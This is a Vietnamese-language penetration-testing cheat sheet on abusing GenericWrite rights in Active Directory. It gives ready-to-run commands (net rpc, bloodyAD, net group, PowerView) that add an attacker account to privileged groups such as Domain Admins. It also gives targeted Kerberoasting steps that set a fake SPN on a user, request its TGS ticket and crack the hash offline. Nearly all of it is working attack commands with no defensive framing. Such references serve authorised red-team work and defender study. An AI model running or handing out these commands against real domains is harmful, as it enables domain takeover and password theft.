# GenericWrite

## GenericWrite đối với Group

### Thao túng tài khoản (T1098)

#### Net RPC – Samba (Linux)

Thêm người dùng vào nhóm đặc quyền (như Domain Admins) để leo thang đặc quyền.

{% code overflow="wrap" %}

```bash
net rpc group addmem "<target_group>" <attacker_user> -U <domain>/<attacker_user>%<attacker_password> -S <dc_ip>
```

{% endcode %}

#### BloodyAD (Linux)

Thêm người dùng vào nhóm đặc quyền để leo thang đặc quyền.

{% code overflow="wrap" %}

```bash
bloodyAD --host "<dc_ip>" -d "<domain>" -u "<attacker_user>" -p "<attacker_password>" add groupMember "<target_group>" "<attacker_user>"
```

{% endcode %}

#### Net Command (Windows)

Thêm người dùng vào nhóm đặc quyền để leo thang đặc quyền.

```powershell
net group "<target_group>" <attacker_user> /add /domain
```

#### PowerView (Windows)

Thêm người dùng hoặc nhóm vào một nhóm đặc quyền để leo thang đặc quyền.

{% code overflow="wrap" %}

```powershell
powershell -ep bypass
Import-Module .PowerView.ps1
$SecPassword = ConvertTo-SecureString '<attacker_password>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<domain>\<attacker_user>', $SecPassword)
Add-DomainGroupMember -Identity '<target_group>' -Members '<attacker_user>' -Credential $Cred
```

{% endcode %}

## GenericWrite đối với User

### Kerberoasting (T1558.003)

#### TargetedKerberoast (Linux)

Yêu cầu vé TGS từ tài khoản dịch vụ, trích xuất hash mật khẩu để bẻ khóa ngoại tuyến.

{% code overflow="wrap" %}

```bash
./targetedKerberoast.py --dc-ip '<dc_ip>' -v -d '<domain>' -u '<attacker_user>' -p '<attacker_password>'
```

{% endcode %}

#### PowerView (Windows)

Yêu cầu vé TGS từ tài khoản dịch vụ, trích xuất hash mật khẩu để bẻ khóa ngoại tuyến.

{% code overflow="wrap" %}

```powershell
powershell -ep bypass
Import-Module .PowerView.ps1
Set-DomainObject -Identity '<target_user>' -Set @{serviceprincipalname='nonexistent/hacking'}
Get-DomainUser '<target_user>' | Select serviceprincipalname
$User = Get-DomainUser '<target_user>'
$User | Get-DomainSPNTicket
```

{% endcode %}
